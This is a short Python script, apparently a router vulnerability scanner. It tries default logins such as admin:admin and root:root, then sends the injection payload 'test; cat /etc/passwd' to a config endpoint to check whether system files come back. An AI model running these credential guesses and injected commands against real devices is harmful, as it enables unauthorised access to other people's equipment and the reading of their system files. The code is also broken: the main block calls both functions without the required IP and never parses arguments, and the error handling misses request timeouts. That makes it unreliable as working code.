"""
Explain vulnerability
"""

from argparse import ArgumentParser

from requests import post


def check_for_cred(ip: str):
    """
    Chekcs for the common hardcoded credentials
    """
    print("Checking for common hardcoded credentials...")

    # TP-Link uses admin as user and admin as passwd
    common_creds = [("admin", "admin"), ("root", "root"), ("admin", "12345")]

    for user, password in common_creds:
        try:
            res = post(
                f"http://{ip}/login",
                data={"username": user, "password": password},
                timeout=10,
            )
            if res:
                # Somtimes routers display Welcome, Admin. Reason behind welcome
                if "welcome" in res.text.lower():
                    print(f"Weak credential found!: {user}:{password}")

                # Checks for status code 200
                elif res.status_code == 200 and "dashboard" in res.text.lower():
                    print(f"Weak credential found!: {user}:{password}")
            else:
                print(f"Error occured, return status: {res.status_code}")
        except TimeoutError as e:
            print(f"Connection error: {e}")


def check_command_injection(ip: str):
    """
    Checks for the command injection vulnerability
    """

    print("Checking for command injection...")

    payload = "test; cat /etc/passwd"

    res = post(f"http://{ip}/config", data={"input": payload}, timeout=10)
    if "root:x" in res.text:
        print("Command injection vulnerability found!")


if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("ip")
    check_for_cred()
    check_command_injection()

